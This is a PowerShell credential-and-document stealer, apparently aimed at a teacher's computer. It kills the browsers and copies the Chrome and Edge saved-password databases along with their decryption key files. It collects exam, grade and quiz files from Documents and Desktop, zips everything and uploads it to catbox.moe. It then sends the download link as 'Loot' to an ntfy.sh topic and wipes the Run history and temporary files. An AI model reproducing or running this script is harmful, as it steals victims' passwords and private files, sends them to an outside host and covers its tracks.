$topic = "data_stwealer_hideen_"

# 1. KILL BROWSER (Unlocks the database files)
Stop-Process -Name "chrome", "msedge", "brave" -Force -ErrorAction SilentlyContinue
Start-Sleep -Seconds 1

# 2. Workspace
$dir = "$env:TEMP\$(65..90|Get-Random -Count 8|%{[char]$_}-join'')"; $zip = "$env:TEMP\update.zip"
mkdir $dir | Out-Null

# 3. BROWSER DATA (User-Level Access)
$app = $env:LOCALAPPDATA
$paths = @{
    "CH" = "$app\Google\Chrome\User Data\Local State"
    "ED" = "$app\Microsoft\Edge\User Data\Local State"
}

foreach ($k in $paths.Keys) {
    if (Test-Path $paths[$k]) {
        $db = $paths[$k].Replace("Local State", "Default\Login Data")
        if (Test-Path $db) { 
            # We copy the DB and the Key. If we can't decrypt here, we do it later on Zorin.
            Copy-Item $paths[$k] -Destination "$dir\$k_key.json" -Force
            Copy-Item $db -Destination "$dir\$k_data.db" -Force
        }
    }
}

# 4. DOCUMENT HUNTER (The 'Teacher' Special)
# Search Documents/Desktop for school-related files
$keywords = "*Exam*", "*Test*", "*Grade*", "*Schedule*", "*Quiz*"
$found = Get-ChildItem -Path "$env:USERPROFILE\Documents", "$env:USERPROFILE\Desktop" -Include $keywords -Recurse -ErrorAction SilentlyContinue | Select-Object -First 10

foreach ($file in $found) {
    Copy-Item $file.FullName -Destination $dir -ErrorAction SilentlyContinue
}

# 5. Package & Send
Add-Type -AssemblyName "System.IO.Compression.FileSystem"
[System.IO.Compression.ZipFile]::CreateFromDirectory($dir, $zip)
$res = curl.exe -s -F "reqtype=fileupload" -F "fileToUpload=@$zip" https://catbox.moe/user/api.php

if ($res -like "http*") {
    Invoke-WebRequest -Uri "https://ntfy.sh/$topic" -Method Post -Body "Loot: $res"
}

# 6. Cleanup
Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -ErrorAction SilentlyContinue
Remove-Item -Recurse -Force $dir, $zip -ErrorAction SilentlyContinue
exit
